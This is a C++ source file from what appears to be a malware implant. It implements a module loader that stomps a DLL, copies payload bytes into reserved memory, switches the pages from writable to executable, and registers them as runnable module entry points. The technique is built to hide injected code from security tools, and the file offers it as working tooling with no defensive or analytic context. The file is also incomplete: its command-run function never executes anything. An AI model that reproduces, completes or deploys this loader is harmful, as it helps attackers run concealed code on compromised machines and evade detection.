#include "modules/modules.h"
#include "packager/packager.h"


Modules* modules = NULL;




BOOL Modules::IsModuleLoaded(INT32 bit) {
	return (this->LoadModulesBitMap >> bit) & 1u;
}


BOOL Modules::LoadModule(PBYTE Module, SIZE_T ModuleSize, INT32 ModuleBit) {
	if ( ! this->IsStompedDllLoaded ) {
		if (!this->LoadStompedDll( ) ) { return FALSE; }
	}


	PVOID ModuleBaseToWrite = this->ReserveArena( ModuleSize );
	if ( ! ModuleBaseToWrite) { return FALSE; }

	SIZE_T PageSize = PAGE_ALIGN(ModuleSize);
	DWORD old = 0;

	NTSTATUS stat = kratos->apis.NtProtectVirtualMemory(GetCurrentProcess(), &ModuleBaseToWrite, &PageSize, PAGE_READWRITE, &old);
	if ( ! NTAPI_SUCCESS( stat ) ) {
		return FALSE;
	}

	utils::mem::memcpy(ModuleBaseToWrite, Module, ModuleSize);

	stat = kratos->apis.NtProtectVirtualMemory(GetCurrentProcess(), &ModuleBaseToWrite, &PageSize, PAGE_EXECUTE_READ, &old);
	if ( ! NTAPI_SUCCESS( stat ) ) {
		return FALSE;
	}

	kratos->apis.NtFlushInstructionCache( GetCurrentProcess( ), ModuleBaseToWrite, PageSize );
	this->UpdateBitField(ModuleBit);
	ModuleInformation* info = this->FindFreeModInfo();
	info->EntryPoint = ModuleBaseToWrite;
	info->id = ModuleBit;
	info->ModuleSizeInMemory = PageSize;

	return TRUE;

}



BOOL Modules::RunModuleCommand(INT32 ModuleBit) {
	if (!this->IsModuleLoaded(ModuleBit)) {
		packager->Pack4(ERROR_MODULE_LOADED);
		return FALSE;
	}

	ModuleInformation* info = this->FindModInfoEntry(ModuleBit);



	return TRUE;
}



INT64 Modules::GetLoadedModulesBitMap() {
	return this->LoadModulesBitMap;
}


void Modules::UpdateBitField(INT32 Bit) {
	this->LoadModulesBitMap ^= (1U << Bit);
}